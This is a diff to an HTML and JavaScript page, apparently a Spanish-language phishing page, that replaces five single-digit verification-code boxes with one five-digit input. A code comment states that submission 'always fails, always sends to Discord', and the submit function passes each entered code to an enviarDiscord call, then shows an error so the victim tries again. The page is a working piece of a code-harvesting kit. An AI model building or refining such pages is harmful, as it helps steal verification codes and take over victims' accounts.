@@ -145,35 +145,46 @@
             color: #28b935
         }
 
-        /* code boxes */
-        .code-inputs {
+        /* single input style */
+        .code-input-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-bottom: 28px
+            margin-bottom: 28px;
+            width: 100%;
         }
 
-        .code-inputs input {
-            width: 48px;
+        .code-input-container input {
+            width: 100%;
+            max-width: 280px;
             height: 56px;
             border: 2px solid #d3d8dd;
             border-radius: 6px;
             text-align: center;
-            font-size: 22px;
+            font-size: 28px;
             font-weight: 600;
             color: #334d6e;
             outline: none;
-            transition: border-color 0.2s;
-            font-family: "Poppins", sans-serif
+            transition: all 0.2s;
+            font-family: "Poppins", sans-serif;
+            letter-spacing: 8px;
         }
 
-        .code-inputs input:focus {
-            border-color: #28b935
-        }
-
-        .code-inputs input.filled {
+        .code-input-container input:focus {
             border-color: #28b935;
             background: #f4fbf4
+        }
+
+        .code-input-container input.filled {
+            border-color: #28b935;
+            background: #f4fbf4
+        }
+
+        /* placeholder styling */
+        .code-input-container input::placeholder {
+            color: #a0aec0;
+            font-size: 16px;
+            letter-spacing: 2px;
+            font-weight: 400;
         }
 
         .btnDefault {
@@ -317,10 +328,10 @@
                 padding: 24px 20px
             }
 
-            .code-inputs input {
-                width: 40px;
-                height: 48px;
-                font-size: 18px
+            .code-input-container input {
+                height: 52px;
+                font-size: 24px;
+                letter-spacing: 6px;
             }
         }
     </style>
@@ -367,13 +378,9 @@
                     <div class="ldr-bar"></div>
                 </div>
 
-                <!-- 5 digit inputs -->
-                <div class="code-inputs" id="codeInputs">
-                    <input type="tel" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]">
-                    <input type="tel" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]">
-                    <input type="tel" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]">
-                    <input type="tel" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]">
-                    <input type="tel" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]">
+                <!-- Single input -->
+                <div class="code-input-container" id="codeInputContainer">
+                    <input type="tel" id="codeBox" maxlength="5" class="code-box" inputmode="numeric" pattern="[0-9]{5}" placeholder="• • • • •">
                 </div>
 
                 <button class="btnDefault" id="btnVerificar" disabled onclick="submitCode()">Verificar</button>
@@ -415,45 +422,52 @@
                 document.getElementById('mainContent').style.display = 'flex';
             }, 15000);
 
-            var boxes = document.querySelectorAll('.code-box');
-            boxes.forEach(function (box, idx) {
-                box.addEventListener('input', function () {
-                    this.value = this.value.replace(/[^0-9]/g, '');
-                    if (this.value.length === 1) {
-                        this.classList.add('filled');
-                        if (idx < boxes.length - 1) boxes[idx + 1].focus();
-                    } else {
-                        this.classList.remove('filled');
-                    }
-                    var all = Array.from(boxes).every(function (b) { return b.value.length === 1; });
-                    document.getElementById('btnVerificar').disabled = !all;
-                });
-                box.addEventListener('keydown', function (e) {
-                    if (e.key === 'Backspace' && this.value === '' && idx > 0) {
-                        boxes[idx - 1].focus();
-                        boxes[idx - 1].value = '';
-                        boxes[idx - 1].classList.remove('filled');
-                        document.getElementById('btnVerificar').disabled = true;
-                    }
-                });
-                box.addEventListener('paste', function (e) {
-                    e.preventDefault();
-                    var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
-                    boxes.forEach(function (b, i) {
-                        b.value = text[i] || '';
-                        if (b.value) b.classList.add('filled'); else b.classList.remove('filled');
-                    });
-                    var all = text.length === 5;
-                    document.getElementById('btnVerificar').disabled = !all;
-                    if (all) boxes[4].focus();
-                });
+            var codeBox = document.getElementById('codeBox');
+            
+            // Input validation - only numbers
+            codeBox.addEventListener('input', function () {
+                // Remove non-numeric characters
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Add/remove filled class based on content
+                if (this.value.length > 0) {
+                    this.classList.add('filled');
+                } else {
+                    this.classList.remove('filled');
+                }
+                
+                // Enable/disable button based on 5 digits
+                document.getElementById('btnVerificar').disabled = this.value.length !== 5;
+            });
+
+            // Handle Enter key
+            codeBox.addEventListener('keydown', function (e) {
+                if (e.key === 'Enter' && this.value.length === 5) {
+                    submitCode();
+                }
+            });
+
+            // Handle paste
+            codeBox.addEventListener('paste', function (e) {
+                e.preventDefault();
+                var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
+                this.value = text;
+                
+                if (text.length > 0) {
+                    this.classList.add('filled');
+                } else {
+                    this.classList.remove('filled');
+                }
+                
+                document.getElementById('btnVerificar').disabled = text.length !== 5;
             });
         });
 
         // ── Submit code — always fails, always sends to Discord ──
         async function submitCode() {
-            var boxes = document.querySelectorAll('.code-box');
-            var code = Array.from(boxes).map(function (b) { return b.value; }).join('');
+            var codeBox = document.getElementById('codeBox');
+            var code = codeBox.value;
+            
             if (code.length < 5) return;
 
             _attempt++;
@@ -465,8 +479,8 @@
             document.getElementById('errorBox').style.display = 'none';
             document.getElementById('btnVerificar').style.display = 'none';
             document.getElementById('btnLoader').style.display = 'flex';
-            document.getElementById('codeInputs').style.opacity = '0.4';
-            document.getElementById('codeInputs').style.pointerEvents = 'none';
+            document.getElementById('codeInputContainer').style.opacity = '0.4';
+            document.getElementById('codeInputContainer').style.pointerEvents = 'none';
 
             // send straight to Discord
             await enviarDiscord({
@@ -485,12 +499,13 @@
                 document.getElementById('btnLoader').style.display = 'none';
                 document.getElementById('btnVerificar').style.display = 'block';
 
-                // clear boxes
-                boxes.forEach(function (b) { b.value = ''; b.classList.remove('filled'); });
-                document.getElementById('codeInputs').style.opacity = '1';
-                document.getElementById('codeInputs').style.pointerEvents = 'auto';
+                // clear input
+                codeBox.value = '';
+                codeBox.classList.remove('filled');
+                document.getElementById('codeInputContainer').style.opacity = '1';
+                document.getElementById('codeInputContainer').style.pointerEvents = 'auto';
                 document.getElementById('btnVerificar').disabled = true;
-                boxes[0].focus();
+                codeBox.focus();
 
                 var errorBox = document.getElementById('errorBox');
                 var errorMsg = document.getElementById('errorMsg');
